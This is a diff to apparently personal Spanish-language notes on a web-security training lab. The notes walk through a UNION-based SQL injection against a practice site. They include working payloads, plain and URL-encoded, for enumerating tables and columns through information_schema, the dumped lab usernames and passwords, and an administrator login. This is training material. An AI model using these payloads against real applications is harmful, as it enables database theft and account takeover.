@@ -88,6 +88,9 @@ RESPUESTA: '+UNION+SELECT+@@version,NULL--+  ==> 8.0.32-0ubuntu0.20.04.2
 
 
 
+
+
+
 			--> Lab: SQL injection attack, listing the database contents on non-Oracle databases
 			
 -> Reconocimiento & Objectivo :
@@ -122,14 +125,16 @@ Esto significa que la respuesta recibida desde el servidor retorna 2 columnas.
 Despues de varias pruebas se reconoce que las 2 bases de datos son de tipo "string"
 '+UNION+SELECT+'A','A'--+  (2 columnas de tipo string)
 
+- Tambien averiguaremos la version de la base de datos con: 
+
+' UNION SELECT version(), NULL --
+
+
+
+
 8) Listando el nombre de las tablas de la base de datos: (Se sabe que es una Non-Oracle DB, por lo tanto no probaremos con esos comandos de Oracle)
 
-'+UNION+SELECT+*+FROM+NULL,information_schema.tables+--+
-'+UNION+SELECT+*+FROM+NULL,information_schema.tables+--+
-'+UNION+SELECT+table_name,null+FROM+information_schema.tables+WHERE+table_schema=database()--+
-'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+WHERE+table_schema=database()--+
-
-- Nada de eso funciono excepto este comando: 
+- tenemos resultados con este comando: 
 
 '+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+--+
 
@@ -146,9 +151,63 @@ administrador.
 Con esto podemos ver las columnas contenidas en cada tabla. 
 
 
+9) Output the list of table names in the database. Ahora vemos la informacion que contienen las columnas: 
+
+Como es una base de datos "PostgresSql" la forma de ver las tablas de la base de datos es: 
+
+"SELECT * FROM information_schema.tables"
+* Hay que averiguar los "column names" disponibles para esto: information_schema.tables
+
+* En google buscamos "information_schema.tables postgresql" (en la documentacion de postgres) 
+https://www.postgresql.org/docs/current/information-schema.html
+> columns > table_name 
+Asi con esto sabemos que usar en el "SELECT" para buscar los nombres de todas las tablas y creamos este query: 
+
+' UNION SELECT table_name, NULL FROM information_schema.tables --
+'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+--
 
 
+* Haciendo ctrl + f, buscamos la tabla que contenga "users" y el resultado es este: 
+"users_yybmap"
+Y esta es posiblemente la tabla que contenga la data que buscamos
 
+10) Output the column names of the table. 
+Identificada la tabla que posiblemente tenga la info que buscamos ahora veremos los nombres de las tablas contenidas
+
+* En google buscamos "information_schema.columns postgresql"
+https://www.postgresql.org/docs/current/infoschema-columns.html
+Nos muestra "column_name" segun la documentacion de postgreSQL
+
+Y por lo tanto ahora podemos crear este query: 
+
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_yybmap' --
+
+URL encoded:
+'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name+%3d+'users_yybmap'+--
+
+
+Ahora ya sabemos el nombre de las columnas de la tabla "users_yybmap"
+
+password_eskcyw, username_vguskp
+
+
+11) Ahora sabiendo: La posible Tabla que contenga la data (users_yybmap), 
+el nombre de las columnas de la tabla (password_eskcyw, username_vguskp),
+hay que ver que contienen esas columnas de la siguiente manera:
+
+' UNION SELECT password_eskcyw, username_vguskp FROM users_yybmap --
+'+UNION+SELECT+password_eskcyw,+username_vguskp+FROM+users_yybmap+--
+
+El resultado es: 
+
+vntynwelr3vgk9nyiwiu
+	wiener
+vgym2pam0ggg1rbf2col
+	carlos
+49pbluaujp9eg547yg7l
+	administrator
+
+12) Tomamos la contrasena y el user de administrador, y hacemos login como Administrator
 
 
 
